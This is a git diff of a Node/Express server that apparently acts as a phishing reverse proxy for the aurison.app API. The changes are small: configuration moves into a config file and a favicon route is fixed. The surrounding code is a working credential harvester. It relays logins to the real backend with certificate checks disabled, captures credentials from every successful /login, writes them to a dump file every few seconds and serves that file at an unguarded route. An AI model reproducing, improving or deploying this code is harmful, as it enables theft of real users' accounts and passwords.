@@ -1,5 +1,6 @@
 //imports
 import { grabCreds as harvestCredentials, writeCreds as credsDump } from './utils/utils.js';
+import { config } from './config.js';
 import bodyParser from 'body-parser';
 import { fileURLToPath } from 'url';
 import path from 'path';
@@ -11,13 +12,9 @@ import https from 'https';
 
 //consts 
 const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);     //hack to make __dirname available in Es6 🤷🏿‍♂️
-const PORT = 55000;
-const STAGING = 'https://test-backend.aurison.app';
-const PROD = 'https://api.aurison.app';
+const __dirname = path.dirname(__filename);     //workaround __dirname variable in Es6 🤷🏿‍♂️
 const AGENT = new https.Agent({ rejectUnauthorized: false });
 const app = express();
-
 
 //vars
 var CREDENTIALS = [];
@@ -34,19 +31,18 @@ app.use((req, res, next) => {
     next();
 })
 
-
-
 app.use('/static', express.static('static'));
-
 
 app.get('/helloworld_dump', (req, res) => res.sendFile(__dirname, '/aurison_creds_dump.txt'));
 
-app.get('/favicon.ico', (req, res) => res.sendFile(__dirname, '/favicon.ico'));
+
+app.get('/favicon.ico', (req, res) => res.sendFile(__dirname + '/favicon.ico'));
+
 //home
 app.get('*', (req, res, next)=>{
     //check if react is trying to access a static file and manually serve it.
     //This happenes when the route doesn't begin with /static, so the static
-    //middleware doesn't catch it, e.g /test/what/static/bla.js
+    //middleware doesn't catch it, e.g /test/whatever/static/bla.js
     if (req.path.includes("/static")) {
         const index = req.path.indexOf("/static");
         const resource = req.path.substring(index); //path to static file.
@@ -94,7 +90,7 @@ app.post('*', async (req, res) =>{
           method: 'POST',
           headers: headers,
           data: body,
-          url: `${STAGING + path}`,
+          url: `${config.ENV + path}`,
           httpsAgent: AGENT
         });   
         
@@ -108,7 +104,7 @@ app.post('*', async (req, res) =>{
         
         //Grab login creds
         if (response.data.error === false && path === '/login') harvestCredentials(req, CREDENTIALS);
-
+ 
         return res.status(200).json(response.data);
 
     } catch (error) {
@@ -127,8 +123,8 @@ app.post('*', async (req, res) =>{
 
 
 //launch
-app.listen(PORT, () => {
+app.listen(config.PORT, () => {
     setInterval(() => credsDump(CREDENTIALS), 5000);   //dump any creds in queue every 10 seconds.
 
-    console.log(`Server is listening on port ${PORT}`);
+    console.log(`Server is listening on port ${config.PORT}`);
 });
